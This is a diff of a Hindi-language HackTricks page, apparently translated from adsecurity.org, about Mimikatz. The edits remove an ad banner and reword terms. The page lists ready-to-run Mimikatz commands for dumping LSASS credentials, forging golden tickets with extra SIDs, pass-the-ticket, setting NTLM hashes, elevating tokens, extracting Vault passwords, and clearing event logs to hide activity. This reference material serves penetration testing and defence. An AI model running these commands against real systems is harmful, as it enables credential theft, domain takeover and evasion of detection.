@@ -2,19 +2,13 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
-
-**मोबाइल सुरक्षा** में अपनी विशेषज्ञता को 8kSec अकादमी के साथ गहरा करें। हमारे आत्म-गति पाठ्यक्रमों के माध्यम से iOS और Android सुरक्षा में महारत हासिल करें और प्रमाणित हों:
-
-{% embed url="https://academy.8ksec.io/" %}
-
 **यह पृष्ठ [adsecurity.org](https://adsecurity.org/?page_id=1821) से आधारित है**। आगे की जानकारी के लिए मूल पृष्ठ देखें!
 
-## LM और स्पष्ट-टेक्स्ट मेमोरी में
+## LM और Clear-Text मेमोरी में
 
 Windows 8.1 और Windows Server 2012 R2 से आगे, क्रेडेंशियल चोरी के खिलाफ सुरक्षा के लिए महत्वपूर्ण उपाय लागू किए गए हैं:
 
-- **LM हैश और स्पष्ट-टेक्स्ट पासवर्ड** अब मेमोरी में संग्रहीत नहीं किए जाते हैं ताकि सुरक्षा बढ़ सके। एक विशिष्ट रजिस्ट्री सेटिंग, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ को `0` के DWORD मान के साथ कॉन्फ़िगर किया जाना चाहिए ताकि डाइजेस्ट प्रमाणीकरण को निष्क्रिय किया जा सके, यह सुनिश्चित करते हुए कि "स्पष्ट-टेक्स्ट" पासवर्ड LSASS में कैश नहीं किए जाते हैं।
+- **LM हैश और प्लेन-टेक्स्ट पासवर्ड** अब मेमोरी में संग्रहीत नहीं किए जाते हैं ताकि सुरक्षा बढ़ सके। एक विशेष रजिस्ट्री सेटिंग, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ को `0` के DWORD मान के साथ कॉन्फ़िगर किया जाना चाहिए ताकि Digest Authentication को निष्क्रिय किया जा सके, यह सुनिश्चित करते हुए कि "clear-text" पासवर्ड LSASS में कैश नहीं किए जाते हैं।
 
 - **LSA सुरक्षा** को स्थानीय सुरक्षा प्राधिकरण (LSA) प्रक्रिया को अनधिकृत मेमोरी पढ़ने और कोड इंजेक्शन से बचाने के लिए पेश किया गया है। यह LSASS को एक संरक्षित प्रक्रिया के रूप में चिह्नित करके प्राप्त किया जाता है। LSA सुरक्षा को सक्रिय करने में शामिल हैं:
 1. _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ पर रजिस्ट्री को संशोधित करना और `RunAsPPL` को `dword:00000001` पर सेट करना।
@@ -42,7 +36,7 @@ Mimikatz में इवेंट लॉग छेड़छाड़ में 
 #### इवेंट लॉग को साफ करना
 
 - **कमांड**: यह क्रिया इवेंट लॉग को हटाने के लिए है, जिससे दुर्भावनापूर्ण गतिविधियों का पता लगाना कठिन हो जाता है।
-- Mimikatz अपने मानक दस्तावेज़ में इवेंट लॉग को सीधे अपने कमांड लाइन के माध्यम से साफ करने के लिए कोई सीधा कमांड प्रदान नहीं करता है। हालाँकि, इवेंट लॉग हेरफेर आमतौर पर Mimikatz के बाहर सिस्टम टूल या स्क्रिप्ट का उपयोग करके विशिष्ट लॉग को साफ करने में शामिल होता है (जैसे, PowerShell या Windows Event Viewer का उपयोग करना)।
+- Mimikatz अपने मानक दस्तावेज़ में सीधे इवेंट लॉग को साफ करने के लिए कोई सीधा कमांड प्रदान नहीं करता है। हालाँकि, इवेंट लॉग हेरफेर आमतौर पर Mimikatz के बाहर सिस्टम टूल या स्क्रिप्ट का उपयोग करके विशिष्ट लॉग को साफ करने में शामिल होता है (जैसे, PowerShell या Windows Event Viewer का उपयोग करना)।
 
 #### प्रयोगात्मक विशेषता: इवेंट सेवा को पैच करना
 
@@ -98,28 +92,28 @@ Example:
 ```bash
 mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
 ```
-### अतिरिक्त केर्बेरोस कमांड
+### अतिरिक्त Kerberos कमांड
 
-- **टिकटों की सूची**:
+- **टिकट सूचीबद्ध करना**:
 
 - कमांड: `kerberos::list`
-- वर्तमान उपयोगकर्ता सत्र के लिए सभी केर्बेरोस टिकटों की सूची बनाता है।
+- वर्तमान उपयोगकर्ता सत्र के लिए सभी Kerberos टिकटों की सूची बनाता है।
 
 - **कैश पास करें**:
 
 - कमांड: `kerberos::ptc`
-- कैश फ़ाइलों से केर्बेरोस टिकटों को इंजेक्ट करता है।
+- कैश फ़ाइलों से Kerberos टिकट इंजेक्ट करता है।
 - उदाहरण: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
 
 - **टिकट पास करें**:
 
 - कमांड: `kerberos::ptt`
-- किसी अन्य सत्र में केर्बेरोस टिकट का उपयोग करने की अनुमति देता है।
+- किसी अन्य सत्र में Kerberos टिकट का उपयोग करने की अनुमति देता है।
 - उदाहरण: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
 
 - **टिकट हटाएं**:
 - कमांड: `kerberos::purge`
-- सत्र से सभी केर्बेरोस टिकटों को साफ करता है।
+- सत्र से सभी Kerberos टिकटों को साफ करता है।
 - संघर्ष से बचने के लिए टिकट हेरफेर कमांड का उपयोग करने से पहले उपयोगी।
 
 ### सक्रिय निर्देशिका छेड़छाड़
@@ -137,9 +131,9 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 - `mimikatz "lsadump::lsa /inject" exit`
 
-- **LSADUMP::NetSync**: एक कंप्यूटर खाते के पासवर्ड डेटा का उपयोग करके DC का अनुकरण करें।
+- **LSADUMP::NetSync**: एक कंप्यूटर खाते के पासवर्ड डेटा का उपयोग करके एक DC की नकल करें।
 
-- _NetSync के लिए मूल संदर्भ में कोई विशिष्ट कमांड प्रदान नहीं की गई है।_
+- _मूल संदर्भ में NetSync के लिए कोई विशिष्ट कमांड प्रदान नहीं किया गया है।_
 
 - **LSADUMP::SAM**: स्थानीय SAM डेटाबेस तक पहुंचें।
 
@@ -149,7 +143,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 - `mimikatz "lsadump::secrets" exit`
 
-- **LSADUMP::SetNTLM**: एक उपयोगकर्ता के लिए एक नया NTLM हैश सेट करें।
+- **LSADUMP::SetNTLM**: एक उपयोगकर्ता के लिए नया NTLM हैश सेट करें।
 
 - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
 
@@ -176,7 +170,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 - `mimikatz "sekurlsa::logonpasswords" exit`
 
-- **SEKURLSA::Tickets**: मेमोरी से केर्बेरोस टिकट निकालें।
+- **SEKURLSA::Tickets**: मेमोरी से Kerberos टिकट निकालें।
 - `mimikatz "sekurlsa::tickets /export" exit`
 
 ### सिड और टोकन हेरफेर
@@ -186,7 +180,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - जोड़ें: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
 - संशोधित करें: _मूल संदर्भ में संशोधन के लिए कोई विशिष्ट कमांड नहीं है।_
 
-- **TOKEN::Elevate**: टोकनों का अनुकरण करें।
+- **TOKEN::Elevate**: टोकन की नकल करें।
 - `mimikatz "token::elevate /domainadmin" exit`
 
 ### टर्मिनल सेवाएँ
@@ -196,17 +190,12 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - `mimikatz "ts::multirdp" exit`
 
 - **TS::Sessions**: TS/RDP सत्रों की सूची बनाएं।
-- _मूल संदर्भ में TS::Sessions के लिए कोई विशिष्ट कमांड प्रदान नहीं की गई है।_
+- _मूल संदर्भ में TS::Sessions के लिए कोई विशिष्ट कमांड प्रदान नहीं किया गया है।_
 
 ### वॉल्ट
 
-- Windows वॉल्ट से पासवर्ड निकालें।
+- Windows Vault से पासवर्ड निकालें।
 - `mimikatz "vault::cred /patch" exit`
 
-<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
-
-**मोबाइल सुरक्षा** में अपनी विशेषज्ञता बढ़ाएं 8kSec अकादमी के साथ। हमारे आत्म-गति पाठ्यक्रमों के माध्यम से iOS और Android सुरक्षा में महारत हासिल करें और प्रमाणित हों:
-
-{% embed url="https://academy.8ksec.io/" %}
 
 {{#include ../../banners/hacktricks-training.md}}
